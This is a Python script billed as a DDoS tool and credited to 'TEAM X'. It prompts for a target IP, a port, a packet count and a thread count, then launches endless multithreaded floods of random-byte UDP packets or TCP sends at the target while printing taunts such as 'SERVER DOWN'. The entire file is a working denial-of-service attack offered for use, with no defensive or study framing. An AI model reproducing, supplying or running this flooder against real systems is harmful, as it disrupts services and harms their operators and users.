import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM X is Presenting to you :


████████╗███████╗░█████╗░███╗░░░███  
╚══██╔══╝██╔════╝██╔══██╗████╗░████ 
░░░██║░░░█████╗░░███████║██╔████╔██ 
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██
░░░██║░░░███████╗██║░░██║██║░╚═╝░██
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═  

Created by KARASKO v2

Created by madara x

	""")
else :
	print("""
  Presenting to you :
┏━━━━┳━━━┳━━━┳━┓┏━┓
┃┏┓┏┓┃┏━━┫┏━┓┃┃┗┛┃┃
┗┛┃┃┗┫┗━━┫┃╋┃┃┏┓┏┓┃
╋╋┃┃╋┃┏━━┫┗━┛┃┃┃┃┃┃
╋╋┃┃╋┃┗━━┫┏━┓┃┃┃┃┃┃
╋╋┗┛╋┗━━━┻┛╋┗┻┛┗┛┗┛

		""")


print("DDos")
ip= str(input("Server ip  :"))
port= int(input("port  :"))
choice = str(input("DDoS Attack?? (y/n):"))
times= int(input("Paket  :"))
threads= int(input("threads X :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[-]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM AS TNIKLO FI OMO!!!!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[-]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM AS TNIKLO FINOMO!!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()